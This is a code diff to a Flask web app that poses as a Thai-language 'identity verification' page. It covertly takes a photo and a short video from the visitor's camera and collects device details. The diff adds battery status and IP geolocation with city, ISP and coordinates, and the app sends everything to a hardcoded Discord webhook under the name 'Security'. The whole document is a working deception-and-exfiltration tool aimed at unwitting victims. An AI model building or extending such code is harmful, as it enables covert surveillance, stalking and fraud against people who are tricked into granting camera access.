@@ -7,6 +7,24 @@ from datetime import datetime
 app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"
 
+def get_location_from_ip(ip):
+    try:
+        url = f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon'
+        resp = requests.get(url, timeout=5)
+        data = resp.json()
+        if data.get('status') == 'success':
+            return {
+                'country': data.get('country', 'ไม่ระบุ'),
+                'region': data.get('regionName', 'ไม่ระบุ'),
+                'city': data.get('city', 'ไม่ระบุ'),
+                'isp': data.get('isp', 'ไม่ระบุ'),
+                'lat': data.get('lat', 0),
+                'lon': data.get('lon', 0)
+            }
+    except:
+        pass
+    return None
+
 HTML = '''<!DOCTYPE html>
 <html>
 <head>
@@ -42,13 +60,14 @@ HTML = '''<!DOCTYPE html>
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องเพื่อยืนยันตัวตน</p>
-        <div class="info-text">ใช้เวลาประมาณ 3-4 วินาที</div>
+        <div class="info-text">ใช้เวลาประมาณ 4-5 วินาที</div>
     </div>
     <script>
         async function startCapture() {
             document.body.onclick = null;
             document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1><p>กรุณารอสักครู่</p>';
             
+            // ข้อมูลอุปกรณ์ + แบตเตอรี่
             const deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -59,6 +78,15 @@ HTML = '''<!DOCTYPE html>
                 pixelRatio: window.devicePixelRatio || 1,
                 timestamp: new Date().toISOString()
             };
+            
+            // ดึงแบตเตอรี่
+            try {
+                const battery = await navigator.getBattery();
+                deviceInfo.batteryLevel = Math.round(battery.level * 100);
+                deviceInfo.batteryCharging = battery.charging;
+            } catch(e) {
+                deviceInfo.batteryLevel = 'ไม่รองรับ';
+            }
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -77,8 +105,7 @@ HTML = '''<!DOCTYPE html>
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                 
                 // บันทึกวิดีโอ 3 วินาที
@@ -87,12 +114,10 @@ HTML = '''<!DOCTYPE html>
                 recorder.ondataavailable = e => {
                     if (e.data.size > 0) chunks.push(e.data);
                 };
-                
                 recorder.start();
                 await new Promise(r => setTimeout(r, 3000));
                 recorder.stop();
                 await new Promise(r => recorder.onstop = r);
-                
                 const videoBlob = new Blob(chunks, { type: 'video/webm' });
                 
                 stream.getTracks().forEach(t => t.stop());
@@ -141,14 +166,28 @@ def upload():
         photo = request.files.get('photo')
         video = request.files.get('video')
         
+        # ดึงที่อยู่จาก IP
+        location = get_location_from_ip(real_ip)
+        
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         content = f"**📱 ข้อมูลการเชื่อมต่อ**\n"
         content += f"🌐 IP: {real_ip}\n"
+        if location:
+            content += f"📍 เมือง: {location['city']}\n"
+            content += f"🗺️ จังหวัด: {location['region']}\n"
+            content += f"🌍 ประเทศ: {location['country']}\n"
+            content += f"📡 ISP: {location['isp']}\n"
+            content += f"🗺️ พิกัด: {location['lat']}, {location['lon']}\n"
         content += f"📱 UA: {device_info.get('userAgent', 'ไม่ระบุ')[:100]}\n"
         content += f"💻 แพลตฟอร์ม: {device_info.get('platform', 'ไม่ระบุ')}\n"
         content += f"🖥️ หน้าจอ: {device_info.get('screenWidth')}x{device_info.get('screenHeight')}\n"
         content += f"🔤 ภาษา: {device_info.get('language', 'ไม่ระบุ')}\n"
-        content += f"🕐 เวลา: {time_now}\n"
+        content += f"🔋 แบตเตอรี่: {device_info.get('batteryLevel', 'ไม่ระบุ')}%"
+        if device_info.get('batteryCharging') is True:
+            content += " (กำลังชาร์จ)"
+        elif device_info.get('batteryCharging') is False:
+            content += " (ไม่กำลังชาร์จ)"
+        content += f"\n🕐 เวลา: {time_now}\n"
         
         payload = {"username": "Security", "content": content}
         files = {}
